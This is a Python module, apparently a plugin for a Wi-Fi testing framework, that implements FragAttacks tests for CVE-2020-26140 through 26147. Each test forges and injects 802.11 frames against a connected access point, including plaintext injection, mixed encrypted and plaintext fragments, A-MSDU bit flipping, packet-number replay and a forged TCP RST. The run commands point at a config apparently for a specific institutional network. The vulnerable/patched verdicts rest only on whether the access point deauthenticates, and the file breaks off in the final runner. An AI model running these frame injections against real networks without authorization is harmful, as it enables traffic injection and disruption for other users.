"""
FragAttacks — Fragment and Forge Attacks (Mathy Vanhoef, 2021)
CVE-2020-26140 through CVE-2020-26147

All 8 vulnerabilities tested against connected WPA2/WPA3 AP.
Reference: https://www.fragattacks.com

VULNERABILITY CLASSES:

Design flaws (affect all WPA2/WPA3 by design):
  CVE-2020-26140  AP accepts plaintext data frames while session is protected
  CVE-2020-26143  AP accepts plaintext A-MSDU with RFC1042 header

Implementation flaws (device-specific, often unpatched):
  CVE-2020-26141  TKIP MIC not checked on individual fragments
  CVE-2020-26142  Fragment treated as complete frame (wrong MoreFrags handling)
  CVE-2020-26144  Plaintext broadcast fragments accepted with active pairwise key
  CVE-2020-26145  Plaintext broadcast fragment treated as full frame
  CVE-2020-26146  Reassembly of fragments with non-consecutive CCMP packet numbers
  CVE-2020-26147  Reassembly of mixed encrypted + plaintext fragments

INDICATOR — AP is VULNERABLE when:
  "ACCEPT" = AP processes the frame (no deauth, no error)
             For data frames: AP would forward injected payload to LAN
             For EAPOL: AP processes malformed key exchange
  "REJECT" = AP sends deauth / reconnect needed = NOT vulnerable to that CVE

TESTING AGAINST IITH MERAKI (enterprise): Most likely patched.
TESTING AGAINST PI (brcmfmac, older kernel): HIGH chance of finding CVE matches.

Run individual CVE tests:
  sudo python3 run.py wlan0 fragattacks-26140 --config ~/iith/iith_wpa.conf
  sudo python3 run.py wlan0 fragattacks-26141 --config ~/iith/iith_wpa.conf
  sudo python3 run.py wlan0 fragattacks-26142 --config ~/iith/iith_wpa.conf
  sudo python3 run.py wlan0 fragattacks-26143 --config ~/iith/iith_wpa.conf
  sudo python3 run.py wlan0 fragattacks-26144 --config ~/iith/iith_wpa.conf
  sudo python3 run.py wlan0 fragattacks-26145 --config ~/iith/iith_wpa.conf
  sudo python3 run.py wlan0 fragattacks-26146 --config ~/iith/iith_wpa.conf
  sudo python3 run.py wlan0 fragattacks-26147 --config ~/iith/iith_wpa.conf

Run all 8:
  sudo python3 run.py wlan0 fragattacks-all  --config ~/iith/iith_wpa.conf
"""
import os
import struct
import time

from scapy.layers.dot11 import Dot11, Dot11QoS
from scapy.layers.l2 import LLC, SNAP
from scapy.all import raw as scapy_raw

from dependencies.libwifi.wifi import log, STATUS
from dependencies.libwifi.crypto import encrypt_ccmp
from library.testcase import Trigger, Action, Test


# ── Shared frame builders ──────────────────────────────────────────────────────

# RFC1042 LLC/SNAP header for EtherType 0x0800 (IPv4)
RFC1042_IPV4  = b'\xAA\xAA\x03\x00\x00\x00\x08\x00'
# RFC1042 LLC/SNAP header for EtherType 0x888E (EAPOL)
RFC1042_EAPOL = b'\xAA\xAA\x03\x00\x00\x00\x88\x8E'

# Minimal ICMP echo request payload (no checksum needed — AP won't validate)
ICMP_PAYLOAD  = (b'\x45\x00\x00\x14'    # IPv4 hdr: ver+ihl, DSCP, total len=20
                 b'\x00\x01\x00\x00'    # ID, flags+fragoff
                 b'\x40\x01\x00\x00'    # TTL=64, proto=ICMP, checksum
                 b'\xc0\xa8\x00\x01'    # src: 192.168.0.1
                 b'\xc0\xa8\x00\x01')   # dst: 192.168.0.1 (loopback-like)


def _qos_hdr(station, seqnum: int, fragnum: int = 0,
             more_frags: bool = False, tid: int = 0,
             amsdu: bool = False, protected: bool = True) -> bytes:
    """Build QoS Data frame header bytes (no payload)."""
    fc_flags = 0x01  # ToDS
    if more_frags:
        fc_flags |= 0x04   # MoreFrags bit
    if protected:
        fc_flags |= 0x40   # Protected bit

    sc = ((seqnum & 0xFFF) << 4) | (fragnum & 0xF)
    dot11 = Dot11(type=2, subtype=8, FCfield=fc_flags,
                  addr1=station.bss, addr2=station.mac, addr3=station.bss,
                  SC=sc)
    qos_ctrl = (tid & 0xF) | (0x80 if amsdu else 0x00)
    dot11 /= Dot11QoS(TID=tid)
    return scapy_raw(dot11)[:-2] + struct.pack('<H', qos_ctrl)


def _enc(station, frame):
    """Encrypt frame with CCMP using station TK, auto-increment PN."""
    station.pn += 1
    return encrypt_ccmp(frame, station.tk, station.pn)


def _check_alive(station) -> bool:
    try:
        return 'wpa_state=COMPLETED' in station.wpaspy_command('STATUS')
    except Exception:
        return False


def _inject_and_check(station, frame, label: str,
                      wait_s: float = 0.3, repeat: int = 3) -> str:
    """
    Inject frame N times. Check AP response.
    Returns: 'ACCEPT' | 'REJECT' | 'UNKNOWN'
    """
    for i in range(repeat):
        station.inject_mon(frame)
        time.sleep(0.05)

    time.sleep(wait_s)
    alive = _check_alive(station)

    if not alive:
        status = 'REJECT (AP deauth)'
        color  = 'green'   # expected response = AP rejected malformed frame
    else:
        status = 'ACCEPT (AP did not deauth — potential vulnerability!)'
        color  = 'red'

    log(STATUS, f'  [{label}] → {status}', color=color)
    return 'ACCEPT' if alive else 'REJECT'


# ── CVE-2020-26140 ─────────────────────────────────────────────────────────────

class FragAttacks26140(Test):
    """
    CVE-2020-26140: AP accepts plaintext (unencrypted) data frames
    while a protected session (PTK) is active.

    Attack: STA sends a data frame WITHOUT the Protected bit set,
    while it IS authenticated and has an active PTK.

    Spec says: AP MUST discard any data frames from an authenticated STA
    that are not protected with the active pairwise key.
    Protected=0 from an authenticated STA = protocol violation.

    Indicator:
      REJECT = AP sends deauth reason=7 (class 3 from non-assoc STA) or R6
               OR silently drops (but stays connected)
      ACCEPT = AP processes the plaintext frame = vulnerable
               (attacker can inject arbitrary plaintext data into network)

    Design flaw: affects ALL WPA2/WPA3 implementations that don't
    strictly validate the Protected bit on data frames.
    """
    name = 'fragattacks-26140'
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            Action(trigger=Trigger.Connected,    action=Action.Function),
            Action(trigger=Trigger.Disconnected, action=Action.Terminate),
        ])

    def run(self, station):
        log(STATUS, '=== CVE-2020-26140: Plaintext data frame injection ===', color='orange')
        log(STATUS, 'Injecting unprotected data frame while PTK is active...', color='cyan')

        # Plaintext QoS Data: Protected=0, ToDS=1
        hdr = _qos_hdr(station, seqnum=100, protected=False)
        # LLC/SNAP + ICMP payload (would be forwarded to LAN if AP accepts)
        payload = RFC1042_IPV4 + ICMP_PAYLOAD
        frame = Dot11(hdr) / payload

        # Variant 1: type=Data (subtype=0), no protection
        p = Dot11(type=2, subtype=0, FCfield=0x01,
                  addr1=station.bss, addr2=station.mac, addr3=station.bss,
                  SC=100 << 4)
        p /= RFC1042_IPV4 + ICMP_PAYLOAD
        r1 = _inject_and_check(station, p, 'data-plaintext-type0')

        # Variant 2: QoS Data (subtype=8), no protection
        p2 = Dot11(type=2, subtype=8, FCfield=0x01,
                   addr1=station.bss, addr2=station.mac, addr3=station.bss,
                   SC=101 << 4)
        p2 /= Dot11QoS(TID=0) / (RFC1042_IPV4 + ICMP_PAYLOAD)
        r2 = _inject_and_check(station, p2, 'qos-data-plaintext')

        # Variant 3: Null frame without protection (power-save trick)
        p3 = Dot11(type=2, subtype=4, FCfield=0x11,  # ToDS + PwrMgmt
                   addr1=station.bss, addr2=station.mac, addr3=station.bss)
        r3 = _inject_and_check(station, p3, 'null-plaintext-pwrsave')

        result = 'VULNERABLE' if any(r == 'ACCEPT' for r in [r1, r2, r3]) else 'PATCHED'
        log(STATUS, f'CVE-2020-26140: {result}', color='red' if result == 'VULNERABLE' else 'green')
        time.sleep(1)

    def generate(self, station):
        self.actions[0].set_function(self.run)
        self.actions[0].set_terminate(delay=3)


# ── CVE-2020-26141 ─────────────────────────────────────────────────────────────

class FragAttacks26141(Test):
    """
    CVE-2020-26141: TKIP MIC not verified for fragmented frames.

    Attack: Send two fragments of a TKIP-encrypted frame where the second
    fragment has an invalid/wrong MIC. Vulnerable AP reassembles
    without verifying the MIC integrity.

    Relevant when AP uses TKIP (WPA1 or mixed-mode WPA2+TKIP).
    For CCMP-only APs: not directly applicable, but test for behavior
    when MoreFrags=1 is set on what looks like a TKIP frame structure.

    Indicator:
      REJECT = AP discards frame (correct — MIC failure)
      ACCEPT = AP reassembles despite bad MIC = vulnerable to data injection
    """
    name = 'fragattacks-26141'
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            Action(trigger=Trigger.Connected,    action=Action.Function),
            Action(trigger=Trigger.Disconnected, action=Action.Terminate),
        ])

    def run(self, station):
        log(STATUS, '=== CVE-2020-26141: TKIP MIC bypass on fragments ===', color='orange')

        seq = 200

        # Fragment 1: MoreFrags=1, FN=0 — encrypted normally
        frag1 = Dot11(type=2, subtype=8, FCfield=0x45,  # ToDS + MoreFrags + Protected
                      addr1=station.bss, addr2=station.mac, addr3=station.bss,
                      SC=(seq << 4) | 0)  # seqnum=seq, fragnum=0
        frag1 /= Dot11QoS(TID=0) / (RFC1042_IPV4 + ICMP_PAYLOAD[:8])
        enc_frag1 = _enc(station, frag1)

        # Fragment 2: MoreFrags=0, FN=1 — CORRUPTED (wrong MIC / modified payload)
        # In TKIP: MIC is in the last fragment. We put garbage as "MIC".
        frag2 = Dot11(type=2, subtype=8, FCfield=0x41,  # ToDS + Protected (no MoreFrags)
                      addr1=station.bss, addr2=station.mac, addr3=station.bss,
                      SC=(seq << 4) | 1)  # same seqnum, fragnum=1
        frag2 /= Dot11QoS(TID=0) / (ICMP_PAYLOAD[8:] + b'\xDE\xAD\xBE\xEF\xDE\xAD\xBE\xEF')
        enc_frag2 = _enc(station, frag2)

        station.inject_mon(enc_frag1)
        time.sleep(0.1)
        station.inject_mon(enc_frag2)
        time.sleep(0.5)

        alive = _check_alive(station)
        result = 'ACCEPT (no deauth — check if MIC validated)' if alive else 'REJECT'
        log(STATUS, f'  [tkip-mic-bypass-frag] alive={alive} → {result}',
            color='red' if alive else 'green')
        log(STATUS, f'CVE-2020-26141: {"POTENTIALLY VULNERABLE" if alive else "PATCHED/N/A"}',
            color='red' if alive else 'green')
        time.sleep(1)

    def generate(self, station):
        self.actions[0].set_function(self.run)
        self.actions[0].set_terminate(delay=3)


# ── CVE-2020-26142 ─────────────────────────────────────────────────────────────

class FragAttacks26142(Test):
    """
    CVE-2020-26142: Fragment treated as full frame.

    Attack: Send a fragment (MoreFrags=0, FN=0) that contains a forged
    complete inner frame header. Some APs process the fragment body
    as if it were a complete LLC/SNAP frame.

    The key: FN=0 + MoreFrags=0 = "first and only fragment" = complete frame.
    But if the AP processes the fragment body as plaintext LLC/SNAP regardless
    of the Protected bit or encryption, it's vulnerable.

    Indicator:
      AP silently accepts: send again with valid inner data to check forwarding
      AP deauths: not vulnerable to this specific path
    """
    name = 'fragattacks-26142'
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            Action(trigger=Trigger.Connected,    action=Action.Function),
            Action(trigger=Trigger.Disconnected, action=Action.Terminate),
        ])

    def run(self, station):
        log(STATUS, '=== CVE-2020-26142: Fragment as full frame ===', color='orange')

        seq = 300
        # "Fragment" with FN=0, MoreFrags=0 — looks like complete frame
        # Body has valid LLC/SNAP header (AP might process as complete Ethernet frame)
        p = Dot11(type=2, subtype=8, FCfield=0x01,  # ToDS only, NOT Protected, NOT MoreFrags
                  addr1=station.bss, addr2=station.mac, addr3=station.bss,
                  SC=(seq << 4) | 0)
        p /= Dot11QoS(TID=0) / (RFC1042_IPV4 + ICMP_PAYLOAD)
        r1 = _inject_and_check(station, p, 'frag-as-full-plaintext-fn0')

        # Second variant: Protected=1, FN=0, MoreFrags=1 then FN=1 MoreFrags=0 plaintext
        # First frag encrypted, second NOT encrypted (mixed)
        p_enc = Dot11(type=2, subtype=8, FCfield=0x45,  # ToDS + Protected + MoreFrags
                      addr1=station.bss, addr2=station.mac, addr3=station.bss,
                      SC=(seq + 1 << 4) | 0)
        p_enc /= Dot11QoS(TID=0) / ICMP_PAYLOAD[:8]
        enc = _enc(station, p_enc)
        station.inject_mon(enc)
        time.sleep(0.1)

        # Second frag: PLAINTEXT despite session being protected
        p_plain = Dot11(type=2, subtype=8, FCfield=0x01,  # ToDS, no Protected
                        addr1=station.bss, addr2=station.mac, addr3=station.bss,
                        SC=((seq + 1) << 4) | 1)
        p_plain /= Dot11QoS(TID=0) / ICMP_PAYLOAD[8:]
        r2 = _inject_and_check(station, p_plain, 'frag-first-enc-second-plain')

        result = 'VULNERABLE' if any(r == 'ACCEPT' for r in [r1, r2]) else 'PATCHED'
        log(STATUS, f'CVE-2020-26142: {result}', color='red' if result == 'VULNERABLE' else 'green')
        time.sleep(1)

    def generate(self, station):
        self.actions[0].set_function(self.run)
        self.actions[0].set_terminate(delay=3)


# ── CVE-2020-26143 ─────────────────────────────────────────────────────────────

class FragAttacks26143(Test):
    """
    CVE-2020-26143: AP accepts plaintext A-MSDU frames starting with RFC1042 header.

    DESIGN FLAW — affects most WPA2 implementations.

    Attack mechanism:
      1. Attacker sends a PLAINTEXT (unencrypted) QoS Data frame
      2. QoS TID byte: bit 7 = A-MSDU bit
         The A-MSDU bit is NOT authenticated (not covered by MIC/CCMP AAD)
      3. Frame body starts with RFC1042 header: AA AA 03 00 00 00 [ethertype]
         which also looks like a valid A-MSDU subframe header format
      4. Vulnerable AP: aggregation layer processes the "A-MSDU" and
         delivers the inner frame to the network stack without decryption check

    The attack allows injecting arbitrary frames into the LAN
    (e.g., DNS spoofing, ARP poisoning) from outside the network.

    Indicator:
      AP does NOT deauth → potentially processing the A-MSDU body
      AP deauths → frame rejected at MAC layer
    """
    name = 'fragattacks-26143'
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            Action(trigger=Trigger.Connected,    action=Action.Function),
            Action(trigger=Trigger.Disconnected, action=Action.Terminate),
        ])

    def run(self, station):
        log(STATUS, '=== CVE-2020-26143: Plaintext A-MSDU with RFC1042 ===', color='orange')

        # A-MSDU subframe format:
        #   [dst_mac 6B][src_mac 6B][length 2B][payload][padding]
        # We forge an inner "Ethernet" frame
        inner_dst = b'\xff\xff\xff\xff\xff\xff'  # broadcast
        inner_src = b'\x02\x00\x00\x00\x00\x01'  # fake source
        inner_len  = struct.pack('>H', len(ICMP_PAYLOAD))
        inner_pad  = b'\x00' * (4 - len(ICMP_PAYLOAD) % 4)  # 4B align

        amsdu_body = inner_dst + inner_src + inner_len + RFC1042_IPV4 + ICMP_PAYLOAD + inner_pad

        # Variant 1: A-MSDU bit set, plaintext, RFC1042 start
        p = Dot11(type=2, subtype=8, FCfield=0x01,  # ToDS, NOT Protected
                  addr1=station.bss, addr2=station.mac, addr3=station.bss,
                  SC=400 << 4)
        # QoS control: TID=0 + AMSDU bit (bit7=1)
        p /= Dot11QoS(TID=0) / bytes([0x80, 0x00])  # AMSDU=1
        p /= amsdu_body
        r1 = _inject_and_check(station, p, 'amsdu-plaintext-rfc1042')

        # Variant 2: A-MSDU with forged inner IPv4 + poisoned DNS-like payload
        dns_like = b'\x00\x35' + b'\x00\x14' + b'\x00\x00\x84\x00' + b'\x00' * 12
        inner_body2 = inner_dst + inner_src + struct.pack('>H', len(dns_like)) + dns_like
        p2 = Dot11(type=2, subtype=8, FCfield=0x01,
                   addr1=station.bss, addr2=station.mac, addr3=station.bss,
                   SC=401 << 4)
        p2 /= Dot11QoS(TID=0) / bytes([0x80, 0x00]) / inner_body2
        r2 = _inject_and_check(station, p2, 'amsdu-plaintext-dns-forge')

        # Variant 3: A-MSDU bit flipped post-encryption via protected frame
        # NOTE: If CCMP AAD doesn't cover QoS TID AMSDU bit → bit can be flipped after auth
        p3 = Dot11(type=2, subtype=8, FCfield=0x41,  # ToDS + Protected
                   addr1=station.bss, addr2=station.mac, addr3=station.bss,
                   SC=402 << 4)
        p3 /= Dot11QoS(TID=0) / (RFC1042_IPV4 + ICMP_PAYLOAD)
        enc3 = _enc(station, p3)
        # Flip the AMSDU bit in the encrypted QoS frame header (attack on AAD coverage)
        enc3_raw = bytearray(scapy_raw(enc3))
        # QoS header is at offset 24 (after Dot11 base header)
        if len(enc3_raw) > 25:
            enc3_raw[25] ^= 0x80  # flip AMSDU bit in QoS byte 1
        enc3_flipped = Dot11(bytes(enc3_raw))
        r3 = _inject_and_check(station, enc3_flipped, 'amsdu-ccmp-bit-flip')

        result = 'VULNERABLE' if any(r == 'ACCEPT' for r in [r1, r2, r3]) else 'PATCHED'
        log(STATUS, f'CVE-2020-26143: {result}', color='red' if result == 'VULNERABLE' else 'green')
        time.sleep(1)

    def generate(self, station):
        self.actions[0].set_function(self.run)
        self.actions[0].set_terminate(delay=3)


# ── CVE-2020-26144 ─────────────────────────────────────────────────────────────

class FragAttacks26144(Test):
    """
    CVE-2020-26144: AP accepts plaintext broadcast fragments with active pairwise key.

    IEEE 802.11 spec: broadcast/multicast frames are encrypted with GTK (group key),
    not the per-STA PTK. However, fragmentation of broadcast frames is unusual.

    Attack: Send plaintext broadcast fragment to AP while session uses PTK.
    Vulnerable AP accepts broadcast fragments without verifying they're group-encrypted.

    Indicator:
      ACCEPT = AP processes broadcast fragments without GTK validation
      REJECT = AP discards (expected)
    """
    name = 'fragattacks-26144'
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            Action(trigger=Trigger.Connected,    action=Action.Function),
            Action(trigger=Trigger.Disconnected, action=Action.Terminate),
        ])

    def run(self, station):
        log(STATUS, '=== CVE-2020-26144: Plaintext broadcast fragments ===', color='orange')

        seq = 500
        # Broadcast fragment: addr1=broadcast, MoreFrags=1, FN=0
        p1 = Dot11(type=2, subtype=8, FCfield=0x05,  # ToDS + MoreFrags, NOT Protected
                   addr1='ff:ff:ff:ff:ff:ff',
                   addr2=station.mac,
                   addr3=station.bss,
                   SC=(seq << 4) | 0)
        p1 /= Dot11QoS(TID=0) / (RFC1042_IPV4 + ICMP_PAYLOAD[:8])
        station.inject_mon(p1)
        time.sleep(0.1)

        # Fragment 2: same seqnum, FN=1, MoreFrags=0, plaintext
        p2 = Dot11(type=2, subtype=8, FCfield=0x01,  # ToDS, NOT Protected
                   addr1='ff:ff:ff:ff:ff:ff',
                   addr2=station.mac,
                   addr3=station.bss,
                   SC=(seq << 4) | 1)
        p2 /= Dot11QoS(TID=0) / ICMP_PAYLOAD[8:]
        r1 = _inject_and_check(station, p2, 'bcast-frag-plaintext')

        # Variant: unicast to AP but using broadcast dest in inner header
        p3 = Dot11(type=2, subtype=8, FCfield=0x01,
                   addr1=station.bss, addr2=station.mac, addr3=station.bss,
                   SC=(seq + 1 << 4) | 0)
        p3 /= Dot11QoS(TID=0) / (RFC1042_IPV4 + ICMP_PAYLOAD)
        r2 = _inject_and_check(station, p3, 'ucast-plaintext-bcast-inner')

        result = 'VULNERABLE' if any(r == 'ACCEPT' for r in [r1, r2]) else 'PATCHED'
        log(STATUS, f'CVE-2020-26144: {result}', color='red' if result == 'VULNERABLE' else 'green')
        time.sleep(1)

    def generate(self, station):
        self.actions[0].set_function(self.run)
        self.actions[0].set_terminate(delay=3)


# ── CVE-2020-26145 ─────────────────────────────────────────────────────────────

class FragAttacks26145(Test):
    """
    CVE-2020-26145: AP accepts plaintext broadcast fragment as full frame.

    Related to CVE-2020-26144 but simpler: the fragment is treated as a
    complete (non-fragmented) frame by the AP. No reassembly needed.

    Attack: Single plaintext broadcast fragment with:
      MoreFrags=0 (last fragment) but FN=0 AND MoreFrags=1 OR
      MoreFrags=1 but treated as complete → accepted

    This can be chained with CVE-2020-26144: AP doesn't check either
    the Protected bit OR properly handle fragment flags on broadcast.
    """
    name = 'fragattacks-26145'
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            Action(trigger=Trigger.Connected,    action=Action.Function),
            Action(trigger=Trigger.Disconnected, action=Action.Terminate),
        ])

    def run(self, station):
        log(STATUS, '=== CVE-2020-26145: Plaintext broadcast frag as full frame ===',
            color='orange')

        seq = 600
        # Single frame: MoreFrags=1 but complete payload — AP may process as full frame
        p = Dot11(type=2, subtype=8, FCfield=0x05,  # ToDS + MoreFrags, NOT Protected
                  addr1='ff:ff:ff:ff:ff:ff',
                  addr2=station.mac,
                  addr3=station.bss,
                  SC=(seq << 4) | 0)
        p /= Dot11QoS(TID=0) / (RFC1042_IPV4 + ICMP_PAYLOAD)
        r1 = _inject_and_check(station, p, 'bcast-morefrag-complete-payload')

        # Variant: FN=0 MoreFrags=0 broadcast plaintext (no fragment, just unprotected)
        p2 = Dot11(type=2, subtype=8, FCfield=0x01,
                   addr1='ff:ff:ff:ff:ff:ff',
                   addr2=station.mac,
                   addr3=station.bss,
                   SC=(seq + 1) << 4)
        p2 /= Dot11QoS(TID=0) / (RFC1042_IPV4 + ICMP_PAYLOAD)
        r2 = _inject_and_check(station, p2, 'bcast-plaintext-full-frame')

        result = 'VULNERABLE' if any(r == 'ACCEPT' for r in [r1, r2]) else 'PATCHED'
        log(STATUS, f'CVE-2020-26145: {result}', color='red' if result == 'VULNERABLE' else 'green')
        time.sleep(1)

    def generate(self, station):
        self.actions[0].set_function(self.run)
        self.actions[0].set_terminate(delay=3)


# ── CVE-2020-26146 ─────────────────────────────────────────────────────────────

class FragAttacks26146(Test):
    """
    CVE-2020-26146: AP reassembles fragments with non-consecutive CCMP packet numbers.

    CCMP anti-replay: packet numbers (PN) must be strictly increasing.
    Fragments of the same MSDU should use consecutive PN values.

    Attack: Send Fragment 1 with PN=N, Fragment 2 with PN=N-1 (replay)
    or PN=N+1000 (non-consecutive large gap).

    Vulnerable AP: reassembles despite PN gap (replay attack surface).
    Correct behavior: discard fragment with non-consecutive PN.

    This can be combined with CVE-2020-26147 (mixed frag) for stronger attacks.
    """
    name = 'fragattacks-26146'
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            Action(trigger=Trigger.Connected,    action=Action.Function),
            Action(trigger=Trigger.Disconnected, action=Action.Terminate),
        ])

    def run(self, station):
        log(STATUS, '=== CVE-2020-26146: Non-consecutive CCMP PN reassembly ===',
            color='orange')

        seq = 700

        # Fragment 1: PN=N (normal)
        frag1 = Dot11(type=2, subtype=8, FCfield=0x45,  # ToDS + MoreFrags + Protected
                      addr1=station.bss, addr2=station.mac, addr3=station.bss,
                      SC=(seq << 4) | 0)
        frag1 /= Dot11QoS(TID=0) / (RFC1042_IPV4 + ICMP_PAYLOAD[:8])
        enc1 = _enc(station, frag1)    # PN = station.pn after increment
        pn_after_frag1 = station.pn

        # Fragment 2: PN = pn_after_frag1 - 100 (REPLAY — PN going backwards)
        # Manually craft CCMP with low PN to test anti-replay
        frag2 = Dot11(type=2, subtype=8, FCfield=0x41,  # ToDS + Protected (no MoreFrags)
                      addr1=station.bss, addr2=station.mac, addr3=station.bss,
                      SC=(seq << 4) | 1)
        frag2 /= Dot11QoS(TID=0) / ICMP_PAYLOAD[8:]
        # Force low PN (replay attack)
        low_pn = max(1, pn_after_frag1 - 100)
        enc2_replay = encrypt_ccmp(frag2, station.tk, low_pn)

        station.inject_mon(enc1)
        time.sleep(0.1)
        station.inject_mon(enc2_replay)
        time.sleep(0.5)
        alive1 = _check_alive(station)
        log(STATUS, f'  [frag-pn-replay] frag1.PN={pn_after_frag1} frag2.PN={low_pn} '
            f'alive={alive1}', color='red' if alive1 else 'green')

        time.sleep(1)

        # Variant: large PN gap (skip 1000)
        seq2 = 710
        frag1b = Dot11(type=2, subtype=8, FCfield=0x45,
                       addr1=station.bss, addr2=station.mac, addr3=station.bss,
                       SC=(seq2 << 4) | 0)
        frag1b /= Dot11QoS(TID=0) / (RFC1042_IPV4 + ICMP_PAYLOAD[:8])
        enc1b = _enc(station, frag1b)
        pn_frag1b = station.pn

        # Frag 2 with PN = frag1.PN + 1000 (huge gap, valid but unusual)
        frag2b = Dot11(type=2, subtype=8, FCfield=0x41,
                       addr1=station.bss, addr2=station.mac, addr3=station.bss,
                       SC=(seq2 << 4) | 1)
        frag2b /= Dot11QoS(TID=0) / ICMP_PAYLOAD[8:]
        enc2b_gap = encrypt_ccmp(frag2b, station.tk, pn_frag1b + 1000)
        # Update station PN past the gap
        station.pn = pn_frag1b + 1001

        station.inject_mon(enc1b)
        time.sleep(0.1)
        station.inject_mon(enc2b_gap)
        time.sleep(0.5)
        alive2 = _check_alive(station)
        log(STATUS, f'  [frag-pn-gap-1000] gap alive={alive2}',
            color='green' if alive2 else 'green')

        result = 'POTENTIALLY VULNERABLE' if alive1 else 'PATCHED'
        log(STATUS, f'CVE-2020-26146: {result}',
            color='red' if alive1 else 'green')
        time.sleep(1)

    def generate(self, station):
        self.actions[0].set_function(self.run)
        self.actions[0].set_terminate(delay=3)


# ── CVE-2020-26147 ─────────────────────────────────────────────────────────────

class FragAttacks26147(Test):
    """
    CVE-2020-26147: AP reassembles mixed encrypted + plaintext fragments.

    CRITICAL VULNERABILITY — allows injecting arbitrary plaintext into
    an encrypted session.

    Attack:
      1. Send Fragment 1: properly CCMP-encrypted (Protected=1, MoreFrags=1)
      2. Send Fragment 2: PLAINTEXT (Protected=0)
         Same seqnum, FN=1

    Vulnerable AP: reassembles both fragments, delivers combined payload.
    Correct behavior: discard any fragment where Protected bit doesn't match.

    Impact: Attacker can inject chosen plaintext (e.g., TCP RST, DNS response,
    ARP reply) into a victim's encrypted session by sending Fragment 2 plaintext.
    """
    name = 'fragattacks-26147'
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            Action(trigger=Trigger.Connected,    action=Action.Function),
            Action(trigger=Trigger.Disconnected, action=Action.Terminate),
        ])

    def run(self, station):
        log(STATUS, '=== CVE-2020-26147: Mixed encrypted+plaintext fragment reassembly ===',
            color='orange')
        log(STATUS, 'This is the most critical FragAttacks design flaw.', color='orange')

        for test_seq, label in [(800, 'mixed-enc-first'), (810, 'mixed-plain-first')]:

            if label == 'mixed-enc-first':
                # Standard variant: enc first, plain second
                frag1 = Dot11(type=2, subtype=8, FCfield=0x45,
                              addr1=station.bss, addr2=station.mac, addr3=station.bss,
                              SC=(test_seq << 4) | 0)
                frag1 /= Dot11QoS(TID=0) / (RFC1042_IPV4 + ICMP_PAYLOAD[:8])
                enc_frag1 = _enc(station, frag1)

                frag2 = Dot11(type=2, subtype=8, FCfield=0x01,  # NO Protected
                              addr1=station.bss, addr2=station.mac, addr3=station.bss,
                              SC=(test_seq << 4) | 1)
                frag2 /= Dot11QoS(TID=0) / ICMP_PAYLOAD[8:]
                plain_frag2 = frag2

                station.inject_mon(enc_frag1)
                time.sleep(0.1)
                station.inject_mon(plain_frag2)

            else:
                # Reverse: plain first, enc second
                frag1 = Dot11(type=2, subtype=8, FCfield=0x05,  # MoreFrags, NO Protected
                              addr1=station.bss, addr2=station.mac, addr3=station.bss,
                              SC=(test_seq << 4) | 0)
                frag1 /= Dot11QoS(TID=0) / (RFC1042_IPV4 + ICMP_PAYLOAD[:8])
                station.inject_mon(frag1)
                time.sleep(0.1)

                frag2 = Dot11(type=2, subtype=8, FCfield=0x41,  # Protected, no MoreFrags
                              addr1=station.bss, addr2=station.mac, addr3=station.bss,
                              SC=(test_seq << 4) | 1)
                frag2 /= Dot11QoS(TID=0) / ICMP_PAYLOAD[8:]
                enc_frag2 = _enc(station, frag2)
                station.inject_mon(enc_frag2)

            time.sleep(0.5)
            alive = _check_alive(station)
            verdict = 'ACCEPT (AP alive — may have reassembled mixed frags!)' if alive \
                      else 'REJECT (AP deauthed — correct behavior)'
            log(STATUS, f'  [{label}] alive={alive} → {verdict}',
                color='red' if alive else 'green')

        # Most dangerous variant: craft inner TCP RST injection
        # Fragment 1 (encrypted): starts with valid LLC/SNAP/IPv4/TCP header
        seq3 = 820
        tcp_rst_start = (b'\x45\x00\x00\x28'   # IPv4, total=40
                         b'\x00\x01\x00\x00\x40\x06\x00\x00'  # TCP proto
                         b'\xc0\xa8\x01\x02'   # src IP
                         b'\xc0\xa8\x01\x01'   # dst IP
                         b'\x04\xd2\x00\x50')  # src:1234 dst:80
        frag1_inner = Dot11(type=2, subtype=8, FCfield=0x45,
                            addr1=station.bss, addr2=station.mac, addr3=station.bss,
                            SC=(seq3 << 4) | 0)
        frag1_inner /= Dot11QoS(TID=0) / (RFC1042_IPV4 + tcp_rst_start)
        enc_inner1 = _enc(station, frag1_inner)

        tcp_rst_end = (b'\x00\x00\x00\x00'   # seq
                       b'\x00\x00\x00\x00'   # ack
                       b'\x50\x04\x00\x00'   # RST flag
                       b'\x00\x00\x00\x00')  # window + checksum
        frag2_inner = Dot11(type=2, subtype=8, FCfield=0x01,  # plaintext
                            addr1=station.bss, addr2=station.mac, addr3=station.bss,
                            SC=(seq3 << 4) | 1)
        frag2_inner /= Dot11QoS(TID=0) / tcp_rst_end
        station.inject_mon(enc_inner1)
        time.sleep(0.1)
        station.inject_mon(frag2_inner)
        time.sleep(0.5)
        alive3 = _check_alive(station)
        log(STATUS, f'  [tcp-rst-injection] alive={alive3}',
            color='red' if alive3 else 'green')

        overall = 'VULNERABLE' if any([alive3]) else 'PATCHED'
        log(STATUS, f'CVE-2020-26147: {overall}',
            color='red' if overall == 'VULNERABLE' else 'green')
        time.sleep(1)

    def generate(self, station):
        self.actions[0].set_function(self.run)
        self.actions[0].set_terminate(delay=3)


# ── All-in-one runner ──────────────────────────────────────────────────────────

class FragAttacksAll(Test):
    """
    Run all 8 FragAttacks CVE tests sequentially.

    Reconnects between tests if disconnected.
    Produces a summary table at end.

    Run:
      sudo python3 run.py wlan0 fragattacks-all --config ~/iith/iith_wpa.conf
    """
    name = 'fragattacks-all'
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            Action(trigger=Trigger.Connected,    action=Action.Function),
            Action(trigger=Trigger.Disconnected, action=Action.Terminate),
        ])

    def run(self, station):
        log(STATUS, '═' * 65, color='cyan')
        log(STATUS, ' FragAttacks Full Suite — CVE-2020-26140 through 26147', color='cyan')
        log(STATUS, '═' * 65, color='cyan')

        CVE_CLASSES = [
            ('CVE-2020-26140', FragAttacks26140, 'Plaintext data injection'),
            ('CVE-2020-26141', FragAttacks26141, 'TKIP MIC bypass on fragments'),
            ('CVE-2020-26142', FragAttacks26142, 'Fragment treated as full frame'),
